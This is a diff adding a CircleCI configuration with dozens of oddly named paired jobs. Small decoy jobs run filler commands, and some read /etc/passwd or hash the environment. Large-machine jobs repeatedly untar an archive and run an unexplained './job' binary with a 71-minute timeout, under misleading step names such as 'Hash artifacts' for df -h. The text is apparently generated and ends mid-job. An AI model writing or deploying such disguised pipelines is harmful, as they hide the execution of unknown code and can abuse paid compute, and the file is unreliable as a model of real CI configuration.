@@ -1,0 +1,1637 @@
+version: 2.1
+
+jobs:
+  resync_sierra-7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: twister dodge
+          command: |
+            mkdir -p /tmp/_bld
+            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/_bld/302.out; true
+            echo "ready: $(sha256sum /tmp/_bld/302.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 302.out
+  sierra-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  Beta_jun12-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: helmet off
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=42; while(n>0){rev = rev (n%10); n=int(n/10)}; print rev}' 2>/dev/null || awk 'BEGIN{print 42}'; true ; } > /tmp/_bld/783x.txt
+            echo "ready: $(sha256sum /tmp/_bld/783x.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 783x.txt
+  jun12-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  step2_produce-quick-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: hanging knee raise
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 50000 | awk '$1%997==0' | wc -l; true ; } > /tmp/_bld/2023-08-15.data
+            echo "ready: $(sha256sum /tmp/_bld/2023-08-15.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2023-08-15.data
+  produce-quick-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  reserve_min-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: loop knot
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; mktemp -u | md5sum; true ; } > /tmp/_bld/artifact
+            echo "ready: $(sha256sum /tmp/_bld/artifact | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - artifact
+  min-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/artifact > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  reload_Validate_Service9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: yellow line
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{printf "%.6f\n", 3.14159 * 2.71828}'; true ; } > /tmp/_bld/main_task_output_v1.out
+            echo "ready: $(sha256sum /tmp/_bld/main_task_output_v1.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - main_task_output_v1.out
+  Validate_Service9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  auditor_update-webhook-leak:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: notify stage
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; sed -n '/^root/p' /etc/passwd | head -1 | md5sum; true ; } > /tmp/_bld/725.out
+            echo "ready: $(sha256sum /tmp/_bld/725.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 725.out
+  update-webhook-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/725.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  alpha_update-metrics-crash:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: qa
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1024 count=50 2>/dev/null | gzip -9 | wc -c; true ; } > /tmp/_bld/ckpt-A.pt
+            echo "ready: $(sha256sum /tmp/_bld/ckpt-A.pt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - ckpt-A.pt
+  update-metrics-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  kick_titan-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: power cycle
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=0;b=1; for(i=0;i<20;i++){print b; c=a+b; a=b; b=c}}' | wc -l; true ; } > /tmp/_bld/step-22.txt
+            echo "ready: $(sha256sum /tmp/_bld/step-22.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-22.txt
+  titan-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  p1_preview:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: dull edge
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; ls /proc 2>/dev/null | grep -c '^[0-9]' 2>/dev/null; true ; } > /tmp/_bld/phase-ready.log
+            echo "ready: $(sha256sum /tmp/_bld/phase-ready.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - phase-ready.log
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  prep_titan-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: microwave
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; mkdir -p /tmp/_bench && touch /tmp/_bench/mark && ls /tmp/_bench; true ; } > /tmp/_bld/audit.gz
+            echo "ready: $(sha256sum /tmp/_bld/audit.gz | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - audit.gz
+  titan-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  reset_py310-lint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: nope
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 200 | awk 'END{print NR*NR+1}'; true ; } > /tmp/_bld/pt-B.pickle
+            echo "ready: $(sha256sum /tmp/_bld/pt-B.pickle | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - pt-B.pickle
+  py310-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  db_ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: chord progression
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk -F: '$3>1000 && $3<2000' /etc/passwd | wc -l; true ; } > /tmp/_bld/step-6.log
+            echo "ready: $(sha256sum /tmp/_bld/step-6.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-6.log
+  ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  Gamma_polaris-plus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: taxi line
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -5 /etc/passwd | awk -F: '{print length($1), $1}' | sort -n | tail -1; true ; } > /tmp/_bld/26.log
+            echo "ready: $(sha256sum /tmp/_bld/26.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 26.log
+  polaris-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  generate_py310-fmt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: bonk
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk 'NR>50' | wc -l; true ; } > /tmp/_bld/phase-done.log
+            echo "ready: $(sha256sum /tmp/_bld/phase-done.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - phase-done.log
+  py310-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  syncer_aug2-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: clean and jerk
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 120354 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/_bld/step-3.out
+            echo "ready: $(sha256sum /tmp/_bld/step-3.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-3.out
+  aug2-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/step-3.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  drain_node18-cov:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: mon morning
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 16761); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/_bld/11.blob
+            echo "ready: $(sha256sum /tmp/_bld/11.blob | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 11.blob
+  node18-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  tap_prometheus-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: amber bulb
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tasks=$(ps -eo pid 2>/dev/null | wc -l) && echo $((tasks)); true ; } > /tmp/_bld/step-28.txt
+            echo "ready: $(sha256sum /tmp/_bld/step-28.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-28.txt
+  prometheus-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/step-28.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  ensure_v6-preview:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: hmm maybe
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; date -d "@1700000000" 2>/dev/null +%Y || date +%Y; true ; } > /tmp/_bld/2024-02-21.data
+            echo "ready: $(sha256sum /tmp/_bld/2024-02-21.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2024-02-21.data
+  v6-preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  verify_helios-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: on the nose
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=0; for(i=1;i<=1000;i++)n^=i; print n}'; true ; } > /tmp/_bld/2024-06-07.data
+            echo "ready: $(sha256sum /tmp/_bld/2024-06-07.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2024-06-07.data
+  helios-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/2024-06-07.data > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  Beta_INIT_LAB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: quick
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; env | md5sum | cut -c1-16; true ; } > /tmp/_bld/checkpoint-main.pkl
+            echo "ready: $(sha256sum /tmp/_bld/checkpoint-main.pkl | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - checkpoint-main.pkl
+  INIT_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  stage_dec11-cleanup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: cold swap
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo -e "A\tB\tC\n1\t2\t3" | awk -F'\t' '{print $2}'; true ; } > /tmp/_bld/382.data
+            echo "ready: $(sha256sum /tmp/_bld/382.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 382.data
+  dec11-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/382.data > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  prep_dan-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: light sprinkle
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; ls /dev | wc -l; true ; } > /tmp/_bld/stage-done.sig
+            echo "ready: $(sha256sum /tmp/_bld/stage-done.sig | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stage-done.sig
+  dan-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/stage-done.sig > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  wire_greg-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: sit still
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo "abcdef" | awk 'BEGIN{FS=""}{for(i=1;i<=NF;i++)print $i}' | wc -l; true ; } > /tmp/_bld/package
+            echo "ready: $(sha256sum /tmp/_bld/package | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - package
+  greg-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  red_node20-cov:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: over there
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; mkdir -p /tmp/_d && chmod 755 /tmp/_d && stat -c %a /tmp/_d && rm -rf /tmp/_d; true ; } > /tmp/_bld/secondary_task_output_v1.txt
+            echo "ready: $(sha256sum /tmp/_bld/secondary_task_output_v1.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - secondary_task_output_v1.txt
+  node20-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  ensure_PROD_DEPLOY_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: dip solo
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="aaabbbccc"; gsub(/[ac]/,"-",s); print s}'; true ; } > /tmp/_bld/95.bin
+            echo "ready: $(sha256sum /tmp/_bld/95.bin | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 95.bin
+  PROD_DEPLOY_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
